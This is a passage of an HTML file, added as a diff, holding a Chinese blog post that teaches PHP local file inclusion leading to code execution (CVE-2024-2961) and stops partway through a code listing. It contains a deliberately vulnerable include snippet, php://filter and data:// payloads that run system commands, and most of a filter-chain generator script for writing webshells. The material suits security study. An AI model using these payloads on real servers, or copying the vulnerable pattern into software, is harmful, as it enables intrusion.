@@ -1,0 +1,1401 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>真正的from LFI to RCE——CVE-2024-2961 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="基础漏洞" />
+  
+  <meta name="description" content="重新拾起被曾经被我忽视掉的漏洞——CVE-2024-2961">
+<meta property="og:type" content="article">
+<meta property="og:title" content="真正的from LFI to RCE——CVE-2024-2961">
+<meta property="og:url" content="http://example.com/posts/28510.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="重新拾起被曾经被我忽视掉的漏洞——CVE-2024-2961">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-09-09T05:34:17.000Z">
+<meta property="article:modified_time" content="2024-09-09T10:23:15.876Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="基础漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg_winter.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/28510.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">真正的from LFI to RCE——CVE-2024-2961</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-09-09T05:34:17.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-09-09</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~37.07K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/28510.html" class="leancloud_visitors" data-flag-title="真正的from LFI to RCE——CVE-2024-2961">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1725877395876"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>重新拾起被曾经被我忽视掉的漏洞——CVE-2024-2961</p>
+<span id="more"></span>
+<h1><span id="lfi"> LFI</span></h1>
+<p>LFI，全称<code>local file include</code>，也就是我们的本地文件包含，在我的文件包含篇有讲到，其最简单的格式就是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;？php</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    	<span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    	<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其最基本的利用形式就是直接包含文件名，如果它是个php文件，我们就用伪协议的形式将其base64后的结果包含进来。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>可以利用data伪协议包含shell，其本质就是写入了一段内容，并且把这个内容包含进来了而已：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain,&lt;?php system(&#x27;tac fla?.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>由此我们引出了伪协议和过滤器<code>filter</code>的概念，php里有各种不同的<code>filter</code>，也可以同时使用多个不同的或者重复多次使用一个<code>filter</code>，每次使用一个<code>filter</code>都需要用<code>|</code>分隔开，例如对<code>flag.php</code>采用两次<code>convert.base64-encode</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode|convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<p>一些常见的<code>filter</code>：</p>
+<blockquote>
+<ul>
+<li>convert.base64-encode，执行base64加密</li>
+<li>convert.base64-decode，执行base64解密</li>
+<li>string.lower，将字符串转换为小写</li>
+<li>string.upper，将字符串转换为大写</li>
+<li>convert.iconv.X.Y，将字符集从X转换成Y</li>
+</ul>
+</blockquote>
+<p>重点讲一下最后一个过滤器，利用到了<code>iconv</code>这个东西，这个在我的文件包含里也有讲过，合理搭配iconv过滤器能够产生意想不到的结果：</p>
+<p>例如我们将字符集从我们常用的<code>UTF-8</code>转换为<code>CSISO2022KR</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://,aaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+<p>它的结果变成了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string(24) &quot;%1B%24%29Caaaaaaaaaaaaaa&quot;</span><br><span class="line"></span><br><span class="line">其实是 string(18) &quot;不可见字符$)Caaaaaaaaaaaaaa&quot;</span><br></pre></td></tr></table></figure>
+<p>利用base64_decode会有一个特性，只接受某些<code>ascii</code>字符(<code>[A-Za-z0-9+=]</code>)进行解密，这样就能够去掉<code>C</code>前面的非法字符。由于我们进行了b64decode，会导致原本正常的<code>Caaaaaaaaaaaaaa</code>变得异常。因此我们再进行一次base64加密即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>
+<p>此时的结果会变成：<code>Caaaaaaaaaaaaaa</code></p>
+<p>由此引出了我们文件包含的一个新的利用方式，<code>iconv</code>。利用iconv可以在文件面前合理添加出我们的字符，例如某道题限制只能够包含<code>/resource=/etc/passwd</code>，但是前面的filter能够让我们自定义添加，这个时候我们合理构造使用的<code>filter</code>就能够写出一个webshell让我们包含，详见<code>php_filter_chain_generator.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span 